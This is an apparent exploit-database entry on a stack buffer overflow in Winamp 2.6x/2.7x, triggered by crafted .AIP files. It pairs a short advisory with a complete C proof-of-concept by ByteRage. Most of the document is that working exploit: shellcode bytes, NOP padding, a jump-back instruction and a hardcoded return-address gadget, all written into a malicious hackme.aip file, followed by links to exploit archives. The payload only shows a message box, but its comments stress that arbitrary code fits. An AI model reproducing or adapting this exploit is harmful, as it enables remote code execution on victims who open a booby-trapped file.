source: http://www.securityfocus.com/bid/2680/info

Winamp is a popular media player supporting MP3 and other filetypes.

Versions of Winamp are vulnerable to a buffer overflow condition triggered during processing of Audiosoft parameter files (*.AIP).

A user may insert a large sequence of characters into an *.AIP file. When parsed by Winamp, the data will cause a stack overflow.

As a result of this overflow, excessive data copied onto the stack can overwrite critical parts of the stack frame such as the calling functions' return address.

Since this data is supplied by the user, it could be made to alter the program's flow of execution.

Properly exploited, a maliciously composed AIP file could be used by a remote attacker (either through email or on a remote hostile website) to execute aribitrary code on a vulnerable system. 

/***************************************************************************
 * wabof3.c - Winamp 2.6x/2.7x proof of concept code                       *
 *                                                                         *
 * proof of concept code written by [ByteRage]                             *
 *                                                                         *
 * the exploit is based upon WMAUDSDK.DLL v4.00.0000.3845, which is the    *
 * version that gets installed with winamp 2.6x / 2.7x. It should work     *
 * fine if that version wasn't overwritten by another program              *
 *                                                                         *
 * <byterage@yahoo.com> / byterage.cjb.net (http://elf.box.sk/byterage/)   *
 ***************************************************************************/

#include <stdio.h>

#define LoadLibraryA "\x8C\x10\x10\x42"

#define GetProcAddress "\xF4\x10\x10\x42"

const char * newEBP = "00000000"; // we'll set EBP=0 and use it in the sploit

const char * newEIP = "83AD1142"; /* The new EIP must jump us to ECX
                                     @4211AD83 we find FFD1 = CALL ECX
                                     (in WMAUDSDK.DLL 4.00.0000.3845) */

// The exploit is no big wonder, it just shows a messagebox and kills
// the winamp process, however we have 2015 bytes for our code and we
// can still reload from the *.AIP so in theory anything is possible...

const char sploit[] =

"\x8B\x35" LoadLibraryA
"\x8B\x3D" GetProcAddress
"\x55""\x66\x68""32""\x68""USER"
"\x54"
"\xFF\xD6"
"\x6A""A""\x66\x68""ox""\x68""ageB""\x68""Mess"
"\x54"
"\x50"
"\xFF\xD7"
"\x55""\x68""ING!""\x68""WARN"
"\x8B\xDC"
"\x55""\x6A""!""\x68""full""\x68""cces""\x68""t su""\x68""ploi"
"\x68""t ex""\x68""ncep""\x68""f co""\x68""of o""\x68"" pro"
"\x68""2.7x""\x68"".6x/""\x68""mp 2""\x68""Wina"
"\x8B\xCC"

"\x6A\x30"
"\x53"
"\x51"
"\x55"
"\xFF\xD0"

"\x55""\x68""EL32""\x68""KERN"
"\x54"
"\xFF\xD6"
"\x6A""s""\x66\x68""es""\x68""Proc""\x68""Exit"
"\x54"
"\x50"
"\xFF\xD7"
"\x55"
"\xFF\xD0"

;

int i;

FILE *file;

int main ()
{
  
  printf("Winamp 2.6x/2.7x proof of concept c0de by [ByteRage]\n");

  file = fopen("hackme.aip", "w+b");
  if (!file) {
    printf("Ouchy, couldn't open hackme.aip for output !\n");
    return 1;
  }
  
  fprintf(file,"%03d%03d%03d%03d%03d%03d%10ld",0,0,0,1,0,0,0);
  
  // (2) our exploit starts here
  fwrite(sploit, 1, sizeof(sploit)-1, file);
  
  // we fill the rest with NOPs
  for (i=0; i<(2015-(sizeof(sploit)-1)); i++) { fwrite("\x90", 1, 1, file); }
  
  // (1) we jump back a little more to (2)
  fwrite("\xE9\x1C\xF8\xFF\xFF", 1, 5, file);
  
  for (i=0; i<28; i++) { fwrite("0", 1, 1, file); }
  
  fwrite(newEBP, 1, 8, file); fwrite(newEIP, 1, 8, file);
  
  // ECX points here on overflow
  // we don't have alot space, so we jump to (1)
  fwrite("\x00\xC0\xEB\xCB", 1, 4, file);
  
  fclose(file);

  printf("hackme.aip created!\n");
  return 0;

}


https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/20820-1.zip

https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/20820-2.zip